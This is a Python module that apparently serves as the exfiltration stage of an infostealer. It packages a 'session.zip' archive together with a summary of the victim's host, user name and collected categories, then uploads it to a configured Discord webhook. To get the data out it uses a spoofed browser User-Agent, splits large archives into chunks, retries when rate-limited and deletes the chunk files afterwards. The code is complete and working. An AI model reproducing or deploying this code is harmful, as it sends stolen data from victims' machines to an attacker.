"""Discord webhook delivery with automatic chunking."""

import json
import os
import time
import urllib.error
import urllib.request
import uuid

import config

from .util import split_file


def _embed(summary):
    fields = [
        {"name": "host", "value": str(summary.get("host", "?")), "inline": True},
        {"name": "user", "value": str(summary.get("user", "?")), "inline": True},
        {"name": "size", "value": str(summary.get("size", "?")), "inline": True},
        {"name": "files", "value": str(summary.get("files", 0)), "inline": True},
        {
            "name": "categories",
            "value": (summary.get("categories") or "-")[:1024],
            "inline": False,
        },
    ]
    return {
        "embeds": [
            {
                "title": "session",
                "color": 0x5865F2,
                "fields": fields,
                "footer": {"text": str(summary.get("time", ""))},
            }
        ]
    }


def _multipart(payload, path=None, filename=None):
    boundary = "----ng" + uuid.uuid4().hex
    body = bytearray()
    body += (
        '--%s\r\nContent-Disposition: form-data; name="payload_json"\r\n'
        "Content-Type: application/json\r\n\r\n" % boundary
    ).encode()
    body += json.dumps(payload).encode()
    body += b"\r\n"
    if path:
        with open(path, "rb") as fh:
            blob = fh.read()
        body += (
            '--%s\r\nContent-Disposition: form-data; name="files[0]"; filename="%s"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
            % (boundary, filename or os.path.basename(path))
        ).encode()
        body += blob
        body += b"\r\n"
    body += ("--%s--\r\n" % boundary).encode()
    return bytes(body), boundary


def _post(url, payload, path=None, filename=None, attempts=3):
    body, boundary = _multipart(payload, path, filename)
    headers = {
        "Content-Type": "multipart/form-data; boundary=%s" % boundary,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    for _ in range(attempts):
        request = urllib.request.Request(url, data=body, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                return 200 <= response.status < 300
        except urllib.error.HTTPError as exc:
            if exc.code == 429:
                try:
                    delay = float(
                        json.loads(exc.read().decode("utf-8", "replace")).get(
                            "retry_after", 2
                        )
                    )
                except Exception:
                    delay = 2.0
                time.sleep(min(delay, 30) + 0.5)
                continue
            return False
        except Exception:
            time.sleep(2.0)
    return False


def deliver(archive, summary):
    if not config.WEBHOOK or "discord.com/api/webhooks/" not in config.WEBHOOK:
        return False
    limit = max(1, int(config.CHUNK_MB)) * 1024 * 1024
    if os.path.getsize(archive) <= limit:
        return _post(config.WEBHOOK, _embed(summary), archive, "session.zip")

    parts = split_file(archive, limit)
    delivered = True
    for index, part in enumerate(parts, 1):
        if index == 1:
            payload = _embed(summary)
            payload["content"] = "`%s` %d parts" % (summary.get("host", "?"), len(parts))
        else:
            payload = {
                "content": "`%s` part %d/%d" % (summary.get("host", "?"), index, len(parts))
            }
        if not _post(config.WEBHOOK, payload, part, "session_%03d.zip" % index):
            delivered = False
        time.sleep(1.2)
    for part in parts:
        try:
            os.remove(part)
        except OSError:
            pass
    return delivered
